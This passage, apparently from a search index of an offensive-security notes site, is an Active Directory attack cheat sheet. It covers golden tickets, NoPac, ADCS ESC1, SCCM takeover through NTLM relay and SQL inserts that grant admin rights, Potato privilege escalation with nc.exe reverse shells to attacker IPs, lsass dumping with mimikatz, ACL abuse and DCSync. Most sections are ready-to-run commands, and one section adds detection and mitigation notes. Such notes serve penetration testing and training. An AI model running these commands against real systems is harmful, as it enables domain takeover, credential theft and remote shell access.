\\\\hostname cmd.exe\n</code></pre> With impacket <pre><code>impacket-ticketer -nthash &lt;krbtgt_ntlm_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt;  &lt;user_name&gt;\n# OR with aes\npython ticketer.py -aesKey &lt;aes_key&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt;  &lt;user_name&gt;\n</code></pre> set ticket env var <pre><code>export KRB5CCNAME=&lt;TGS_ccache_file&gt;\n</code></pre> Then you can access anything <pre><code>impacket-psexec &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass\n</code></pre></p>","tags":["Authenticated","Kerberos","Persistence","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/NoPac%20%28SamAccountName%20Spoofing%29/","title":"NoPac (SamAccountName Spoofing)","text":"<p>https://github.com/Ridter/noPac.git</p>","tags":["Authenticated","Domain-Admin","Lateral-Movement","Local","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/NoPac%20%28SamAccountName%20Spoofing%29/#identify","title":"Identify","text":"<p><pre><code>sudo python3 scanner.py domain.local/user:'password' -dc-ip &lt;DCIP&gt; -use-ldap\n</code></pre> nxc: <pre><code>nxc smb &lt;ip&gt; -u 'user' -p 'pass' -M nopac\n</code></pre></p>","tags":["Authenticated","Domain-Admin","Lateral-Movement","Local","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/NoPac%20%28SamAccountName%20Spoofing%29/#exploit","title":"Exploit","text":"<p><pre><code>sudo python3 noPac.py DOMAIN.LOCAL/user:'pass' -dc-ip &lt;dcip&gt;  -dc-host DC01 -shell --impersonate administrator -use-ldap\n</code></pre> <pre><code>sudo python3 noPac.py DOMAIN.LOCAL/user:'pass' -dc-ip &lt;dcip&gt;  -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user DOMAIN/administrator\n</code></pre></p> <p>OPSEC: will spawn a SYSTEM shell with smbsexec - shell may establish but defender will likely block further execution.</p>","tags":["Authenticated","Domain-Admin","Lateral-Movement","Local","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/%C2%A9%EF%B8%8F%20ADCS/","title":"\u00a9\ufe0f ADCS","text":"","tags":["Authenticated","Certificate-Service","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/%C2%A9%EF%B8%8F%20ADCS/#identify","title":"Identify","text":"","tags":["Authenticated","Certificate-Service","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/%C2%A9%EF%B8%8F%20ADCS/#from-windows","title":"From Windows","text":"<p>Check if \u201cCert Publishers\u201d group exists (checks if ADCS is enabled) <pre><code>net localgroup \"Cert Publishers\"\n</code></pre> Use cerify.exe <pre><code>.\\Certify.exe find /vulnerable\n</code></pre> Powershell <pre><code>Get-ADObject -LDAPFilter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=Domain,DC=local'\n</code></pre></p>","tags":["Authenticated","Certificate-Service","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/%C2%A9%EF%B8%8F%20ADCS/#from-linux","title":"From Linux","text":"<p>NetExec <pre><code>nxc ldap &lt;IP&gt; -u \"user\" -p \"Password123!\" -M adcs\n</code></pre> ldap <pre><code>ldapsearch -x -D \"CN=svc-ldapuser,CN=Users,DC=certified,DC=htb\" -w 'SuperSecretPass' -b \"DC=certified,DC=htb\" \"(&amp;(objectClass=pKIEnrollmentService))\" -H ldap://10.129.229.25\n</code></pre> Certipy <pre><code>certipy-ad find -u 'user@domain.local' -p 'Password123!' -dc-ip &lt;IP&gt; -vulnerable -stdout\n</code></pre></p>","tags":["Authenticated","Certificate-Service","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/%C2%A9%EF%B8%8F%20ADCS/#exploit","title":"Exploit","text":"","tags":["Authenticated","Certificate-Service","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/%C2%A9%EF%B8%8F%20ADCS/#esc1","title":"ESC1","text":"<p>If a template is vulnerable to ESC1, certipy can automatically exploit it. Request the Administrators certificate: <pre><code>certipy-ad req -u &lt;user&gt; -p &lt;password&gt; -dc-ip &lt;IP&gt; -template &lt;Template Name&gt; -upn Administrator@certified.htb -ca &lt;Certificate Authorities&gt; -target dc.domain.local\n</code></pre> Request TGS &amp; NTLM hash with certificate: <pre><code>certipy-ad auth -pfx administrator.pfx -dc-ip &lt;IP&gt;\n</code></pre> Or with NXC: <pre><code>nxc smb &lt;IP&gt; --pfx-cert administrator.pfx -u 'Administrator'\n</code></pre></p>","tags":["Authenticated","Certificate-Service","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/","title":"SCCM Site Takeover I","text":"","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/#technique","title":"Technique","text":"<p>This takeover technique is possible when the SCCM MSSQL Site Database is hosted on a server separate from the Primary Site Server. In this configuration, the Primary Site Server's machine account (e.g., <code>SCCM01$</code>) is typically a local administrator on the database server.</p> <p>An attacker can coerce authentication from the Primary Site Server (using a tool like PetitPotam) and relay the NTLM session to the MSSQL service on the database server. This grants the attacker <code>dbo</code> (database owner) privileges, allowing them to directly modify the SCCM database tables to add their own account as a Full Administrator, leading to a complete compromise of the SCCM environment.</p>","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/#prerequisites","title":"Prerequisites","text":"<p>Access Level: An account on the domain. No special or elevated privileges are required to initiate the attack.</p> <p>System State:</p> <ul> <li>The MSSQL Site Database is hosted on a different server than the Primary Site Server.</li> <li>The Primary Site Server's computer account is a local administrator on the database server.</li> <li>The MSSQL service port (typically <code>1433/TCP</code>) is accessible from the attacker's position.</li> <li>SMB Signing must not be required on the target database server.</li> </ul> <p>Information: The IP addresses of the Primary Site Server (to coerce) and the MSSQL server (to relay to).</p>","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/#considerations","title":"Considerations","text":"<p>Impact</p> <p>A successful attack results in a full takeover of the SCCM site. By gaining Full Administrator rights, an attacker can deploy malicious applications, execute arbitrary scripts as <code>SYSTEM</code> on any managed client, and move laterally throughout the entire network managed by SCCM.</p> <p>OPSEC</p> <ul> <li>Coercion Noise: Authentication coercion attempts (e.g., EFS RPC calls from PetitPotam) are often flagged by modern EDR and security monitoring solutions.</li> <li>Relay Detection: NTLM relay traffic is highly suspicious. A machine account authenticating from an unexpected host (the attacker's relay) is a major red flag.</li> <li>Database Auditing: Direct writes to sensitive SCCM tables like <code>RBAC_Admins</code> are a high-fidelity indicator of compromise if database auditing is enabled.</li> </ul>","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/#identify","title":"Identify","text":"<p>If <code>CN=System Management,CN=System</code> AD object exists, sccm is installed LDAP also creates new <code>object class</code> entries, such as <code>mssmsmanagementpoint</code> or <code>mssmssite</code>.</p> <p>Using sccmhunter </p> <pre><code>git clone -q https://github.com/garrettfoster13/sccmhunter\ncd sccmhunter\npython3 -m venv .sccmhunter\nsource .sccmhunter/bin/activate\npython3 -m pip install -r requirements.txt\n</code></pre> <p>Sccmhunter will help us extract from each server the following information:</p> <ul> <li>The SCCM site code. </li> <li>Whether the server is a Central Administration Site (CAS). </li> <li>The SMB signing status (helpful in performing later NTLM relay attacks). </li> <li>Whether the server is the SCCM Primary Server or not. </li> <li>Whether it is the SCCM Distribution Point or not. </li> <li>Whether it is the SCCM SMS Provider or not. </li> <li>Whether the WSUS and MSSQL services are running on it or not.</li> </ul> <pre><code>python3 sccmhunter.py find -u &lt;user&gt; -p &lt;pass&gt; -d domain.local -dc-ip &lt;dc-ip&gt;\n</code></pre> <p>This command performs these checks: 1. Checks the DACL for the <code>System Management</code> container manually created during AD schema extension. 2. Checks for published <code>Managment Points</code>. 3. Checks for strings <code>SCCM</code> and <code>MECM</code> in the entire directory.</p> <p>note</p> <p>To see the results, we can use the <code>-debug</code> option during the command execution or use <code>show -all</code> after we execute the command:</p> <pre><code>python3 sccmhunter.py show -all\n</code></pre> <p>Additionally, we can utilize the <code>smb</code> module to profile and list SMB shares of identified SCCM servers.</p> <ol> <li> <p>Profiling the site server:</p> <ul> <li>Validates connectivity.</li> <li>Verifies if the site server hosts the MSSQL service.</li> <li>Determines if the site server is active or passive.</li> <li>Identify whether the site server is a central administration site.</li> </ul> </li> <li> <p>Management point verifications.</p> <ul> <li>Validates connectivity to the HTTP endpoints.</li> </ul> </li> <li> <p>Checks for roles and configurations.</p> <ul> <li>Searches for associated site codes from default file shares.</li> <li>Verify whether the SMB signing is turned off.</li> <li>Identifies the site system roles such as Site Server, Management Point, Distribution Point, SMS Provider, MSSQL, and WSUS.</li> </ul> </li> </ol> <p>Search for PXEBoot variables and save them:</p> <pre><code>python3 sccmhunter.py smb -u &lt;user&gt; -p &lt;pass&gt; -d domain.local -dc-ip &lt;dc-ip&gt; -save\n</code></pre> <p>Additionally, the SharpSCCM (C#) tool can also be utilized on Windows systems and it provides features for enumeration, credential gathering and lateral movement without requring access to the SCCM administration console.</p>","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/#execution","title":"Execution","text":"<p>Step 1: Set up NTLM Relay</p> <p>Use <code>ntlmrelayx.py</code> to listen for incoming connections and relay them to the target MSSQL server. The <code>-socks</code> flag creates a proxy session upon successful relay.</p> <pre><code>impacket-ntlmrelayx -t \"mssql://&lt;MSSQL_SERVER_IP&gt;\" -smb2support -socks\n</code></pre> <p>Step 2: Coerce Authentication</p> <p>PetitPotam: <pre><code>python3 PetitPotam.py -u &lt;user&gt; -p '&lt;password&gt;' -d &lt;domain&gt; &lt;ATTACKER_IP&gt; &lt;PRIMARY_SITE_SERVER_IP&gt;\n</code></pre></p> <p>Attempt various methods: (coercer)</p> <pre><code>python3 coercer.py coerce -l &lt;attackerIP&gt; -t &lt;targetIP&gt; -u 'user' -p 'pass' -d &lt;domain.local&gt; -v\n</code></pre> <p>Step 3: Access the Database via Relayed Session</p> <p>Use the created SOCKS proxy with proxychains and mssqlclient.py to connect to the database as the relayed machine account.</p> <pre><code>proxychains4 -q python3 mssqlclient.py 'DOMAIN/PRIMARY_SITE_SERVER_NAME$'@&lt;MSSQL_SERVER_IP&gt; -windows-auth -no-pass\n</code></pre> <p>Step 4: Grant Admin Privileges in the Database</p> <p>Execute a series of SQL queries to add an attacker-controlled user (e.g., LAB\\User) as a Full Administrator.</p> <p>Get SID</p> <pre><code>Get-DomainUser &lt;User&gt; -Properties objectsid\n</code></pre> <p>Convert to binary</p> <pre><code>function Convert-StringSidToBinary {\n    param ([string]$StringSid)\n    $sid = New-Object System.Security.Principal.SecurityIdentifier $StringSid\n    $binarySid = New-Object byte[] ($sid.BinaryLength)\n    $sid.GetBinaryForm($binarySid, 0)\n    $binarySidHex = ($binarySid | ForEach-Object { $_.ToString(\"X2\") }) -join ''\n    echo \"0x$($binarySidHex.ToLower())\"\n}\n\nConvert-StringSidToBinary \"&lt;SID&gt;\"\n</code></pre> <p>Add user into admins table</p> <pre><code>USE CM_&lt;SiteCode&gt;;\nINSERT INTO RBAC_Admins (AdminSID, LogonName, IsGroup, IsDeleted, SourceSite) VALUES (&lt;hex of convertedsid&gt;, 'LAB\\User', 0, 0, '&lt;SiteCode&gt;');\n</code></pre> <p>Retrieve the new adminID</p> <pre><code>SELECT AdminID, LogonName FROM RBAC_Admins;\n</code></pre> <p>Assign <code>Full Administrator</code> to yourself</p> <pre><code>INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) VALUES (&lt;new_admin_id&gt;, 'SMS0001R', 'SMS00ALL', '29');\nINSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) VALUES (&lt;new_admin_id&gt;, 'SMS0001R', 'SMS00001', '1');\nINSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) VALUES (&lt;new_admin_id&gt;, 'SMS0001R', 'SMS00004', '1');\n</code></pre>","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/#cleanup-considerations","title":"Cleanup Considerations","text":"<ul> <li>Remove the user from SCCM Full Administrator upon completion of engagement</li> </ul>","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/#detection","title":"Detection","text":"<ul> <li> <p>Monitor for authentication coercion attempts against high-value servers (e.g., unexpected EFS RPC traffic).</p> </li> <li> <p>Alert when machine accounts authenticate from IPs other than their own, which is indicative of a relay attack.</p> </li> <li> <p>Implement database auditing to monitor for direct, unauthorized modifications to <code>RBAC_Admins</code> and <code>RBAC_ExtendedPermissions</code> tables.</p> </li> <li> <p>Regularly audit the list of SCCM Full Administrators for unauthorized additions.</p> </li> </ul>","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/#mitigation","title":"Mitigation","text":"<ul> <li> <p>Enable EPA: Enable Extended Protection for Authentication on the MSSQL service to cryptographically bind the service to the TLS session, mitigating relay attacks.</p> </li> <li> <p>Co-locate Roles: Install the SCCM database on the Primary Site Server itself. This eliminates the need for the server's machine account to have admin rights on a separate database server.</p> </li> <li> <p>Patch Systems: Apply security updates that mitigate NTLM coercion vulnerabilities like PetitPotam.</p> </li> </ul>","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Local/Token%20Privileges/","title":"Token Privileges","text":"","tags":["Local","Privilege-Escalation","SeAssignPrimaryPrivilege","SeBackupPrivilege","SeCreateTokenPrivilege","SeDebugPrivilege","SeImpersonatePrivilege","SeLoadDriverPrivilege","SeRestorePrivilege","SeTakeOwnershipPrivilege","SeTcbPrivilege","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Local/Token%20Privileges/#identify","title":"identify","text":"<p><pre><code>whoami /priv\n</code></pre> Or sysinternals</p> <p>https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk <pre><code>accesschk.exe -p\n</code></pre></p>","tags":["Local","Privilege-Escalation","SeAssignPrimaryPrivilege","SeBackupPrivilege","SeCreateTokenPrivilege","SeDebugPrivilege","SeImpersonatePrivilege","SeLoadDriverPrivilege","SeRestorePrivilege","SeTakeOwnershipPrivilege","SeTcbPrivilege","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Local/Token%20Privileges/#exploit","title":"Exploit","text":"","tags":["Local","Privilege-Escalation","SeAssignPrimaryPrivilege","SeBackupPrivilege","SeCreateTokenPrivilege","SeDebugPrivilege","SeImpersonatePrivilege","SeLoadDriverPrivilege","SeRestorePrivilege","SeTakeOwnershipPrivilege","SeTcbPrivilege","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Local/Token%20Privileges/#seimpersonate-seassignprimarytoken","title":"SeImpersonate &amp; SeAssignPrimaryToken","text":"<p>Windows Server 2016 and under:  JuicyPotato https://github.com/ohpe/juicy-potato <pre><code>JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe 10.10.15.119 5555 -e cmd.exe\" -t *\n</code></pre> Windows Server 2019 and on: PrintSpoofer: https://github.com/itm4n/PrintSpoofer Spawn shell over new process need stable shell <pre><code>PrintSpoofer.exe -i -c cmd.exe\n</code></pre> Spawn revshell <pre><code>PrintSpoofer.exe -c \"c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd\"\n</code></pre> RoguePotato: https://github.com/antonioCoco/RoguePotato <pre><code>RoguePotato.exe -r &lt;IP&gt; -e \"C:\\Windows\\Tasks\\nc.exe &lt;IP&gt; &lt;port&gt; -e cmd.exe\" -l 9999\n</code></pre> SweetPotato: https://github.com/CCob/SweetPotato <pre><code>SweetPotato.exe -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"-w hidden -enc &lt;ENCODED REVSHELL&gt;\"\n</code></pre> OR <pre><code>SweetPotato.exe -e EfsRpc -p c:\\Users\\Public\\nc.exe -a \"10.10.10.10 1234 -e cmd\"\n</code></pre> GodPotato: https://github.com/BeichenDream/GodPotato <pre><code>GodPotato.exe -cmd \"cmd /c whoami\"\n</code></pre> <pre><code>GodPotato -cmd \"nc -t -e C:\\Windows\\System32\\cmd.exe 192.168.1.102 2012\"\n</code></pre></p>","tags":["Local","Privilege-Escalation","SeAssignPrimaryPrivilege","SeBackupPrivilege","SeCreateTokenPrivilege","SeDebugPrivilege","SeImpersonatePrivilege","SeLoadDriverPrivilege","SeRestorePrivilege","SeTakeOwnershipPrivilege","SeTcbPrivilege","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Local/Token%20Privileges/#sedebug","title":"SeDebug","text":"<p>Dumping lsass</p> <p><pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp\n</code></pre> or with task manager </p> <p>read with mimikatz or pypykatz</p> <pre><code>mimikatz # sekurlsa::minidump lsass.dmp\nmimikatz # sekurlsa::logonpasswords\n</code></pre> <pre><code>pypykatz lsa minidump lsass.dmp\n</code></pre> <p>Elevating to SYSTEM</p> <p>https://github.com/decoder-it/psgetsystem</p> <p>Using psgetsystem we can launch a child process that inherits the token of the parent process.</p> <pre><code>PS C:\\tools&gt; tasklist \n\nImage Name                     PID Session Name        Session#    Mem Usage\n========================= ======== ================ =========== ============\nSystem Idle Process              0 Services                   0          4 K\nSystem                           4 Services                   0        116 K\nsmss.exe                       340 Services                   0      1,212 K\ncsrss.exe                      444 Services                   0      4,696 K\nwininit.exe                    548 Services                   0      5,240 K\ncsrss.exe                      556 Console                    1      5,972 K\nwinlogon.exe                   612 Console                    1     10,408 K\n</code></pre> <p>We can target the <code>winlogon.exe</code> service because its running as SYSTEM.</p> <p>We can either 1. launch cmd.exe as SYSTEM if we have GUI access or 2. execute an exe to get a reverse shell, add ourselves to a group, or anything else.</p> <pre><code>import-module .\\psgetsys.ps1\nImpersonateFromParentPid -ppid 612 -command C:\\Windows\\Tasks\\elev.exe\n</code></pre> <p>that process will launch with the integrity of the parent. (Hopefully SYSTEM)</p>","tags":["Local","Privilege-Escalation","SeAssignPrimaryPrivilege","SeBackupPrivilege","SeCreateTokenPrivilege","SeDebugPrivilege","SeImpersonatePrivilege","SeLoadDriverPrivilege","SeRestorePrivilege","SeTakeOwnershipPrivilege","SeTcbPrivilege","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Domain%20ACLs/","title":"Domain ACLs","text":"<p>List of abusable ACEs</p> <ul> <li><code>ForceChangePassword</code> abused with <code>Set-DomainUserPassword</code></li> <li><code>Add Members</code> abused with <code>Add-DomainGroupMember</code></li> <li><code>GenericAll</code> abused with <code>Set-DomainUserPassword</code> or <code>Add-DomainGroupMember</code></li> <li><code>GenericWrite</code> abused with <code>Set-DomainObject</code></li> <li><code>WriteOwner</code> abused with <code>Set-DomainObjectOwner</code></li> <li><code>WriteDACL</code> abused with <code>Add-DomainObjectACL</code></li> <li><code>AllExtendedRights</code> abused with <code>Set-DomainUserPassword</code> or <code>Add-DomainGroupMember</code></li> <li><code>Addself</code> abused with <code>Add-DomainGroupMember</code></li> </ul>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Domain%20ACLs/#identify","title":"Identify","text":"<p>Windows (powerview) <pre><code>Find-InterestingDomainAcl\n</code></pre> <pre><code>Import-Module .\\PowerView.ps1\n$sid = Convert-NameToSid wley\n</code></pre> <pre><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} \n</code></pre> Check what objects have ACLs over a specific user <pre><code>Get-DomainObjectAcl -Identity harry.jones -Domain inlanefreight.local -ResolveGUIDs\n</code></pre></p> <p>ACLs are granted to USER1 over USER2 <pre><code>(Get-ACL \"AD:$((Get-ADUser &lt;USER2&gt;).distinguishedname)\").access  | ? {$_.IdentityReference -eq \"DOMAIN.LOCAL\\USER1\"}\n</code></pre> FInd all users with a specific ACL over USER1 (GenericAll in this example) <pre><code>(Get-ACL \"AD:$((Get-ADUser &lt;USER1&gt;).distinguishedname)\").access  | ? {$_.ActiveDirectoryRights -match \"WriteProperty\" -or $_.ActiveDirectoryRights -match \"GenericAll\"} | Select IdentityReference,ActiveDirectoryRights -Unique | ft -W\n</code></pre></p> <p>Note</p> <p>that if PowerView has already been imported, the cmdlet shown below will result in an error. Therefore, we may need to run it from a new PowerShell session. Or just look at bloodhound</p> <p>Manually <pre><code>Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt\n</code></pre> <pre><code>foreach($line in [System.IO.File]::ReadLines(\"C:\\Users\\htb-student\\Desktop\\ad_users.txt\")) {get-acl  \"AD:\\$(Get-ADUser $line)\" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\\\wley'}}\n</code></pre> from here we would google the \u201cObjectType\u201d entry to find the rights the GUID represents</p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Domain%20ACLs/#exploit","title":"Exploit","text":"","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Domain%20ACLs/#force-change-password","title":"Force-Change-Password","text":"<p><pre><code>$SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE&gt;' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\wley', $SecPassword) \n</code></pre> <pre><code>$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\n</code></pre> <pre><code>Import-Module .\\Powerview.ps1\n</code></pre> <pre><code>Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose\n</code></pre></p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Domain%20ACLs/#add-domaingroupmember","title":"Add-DomainGroupMember","text":"<p><pre><code>$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\damundsen', $SecPassword) \n</code></pre> <pre><code>Import-Module .\\Powerview.ps1\n</code></pre> <pre><code>Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose\n</code></pre> <pre><code>Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName\n</code></pre></p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Domain%20ACLs/#genericall","title":"GenericAll","text":"<p>Targeted kerberoast <pre><code>Import-Module .\\Powerview.ps1\n</code></pre> <pre><code>Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose\n</code></pre> <pre><code>.\\Rubeus.exe kerberoast /user:adunn /nowrap\n</code></pre> Add user to domain admins <pre><code>Net group \"domain admins\" &lt;user&gt; /add /domain\n</code></pre></p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Domain%20ACLs/#ds-replication-get-changes-all","title":"DS-Replication-Get-Changes-All","text":"<p>From linux <pre><code>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5\n</code></pre> From windows <pre><code>runas /netonly /user:INLANEFREIGHT\\adunn powershell\n</code></pre> <pre><code>.\\mimikatz.exe\nprivilege::debug\nlsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\administrator\n</code></pre></p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Domain%20ACLs/#remove-spn","title":"Remove SPN","text":"<p>Removing the Fake SPN from adunn's Account <pre><code>Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose\n</code></pre> Removing damundsen from the Help Desk Level 1 Group <pre><code>Remove-DomainGroupMember -Identity \"Help Desk Level 1\" -Members 'damundsen' -Credential $Cred2 -Verbose\n</code></pre> Confirming damundsen was Removed from the Group <pre><code>Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName |? {$_.MemberName -eq 'damundsen'} 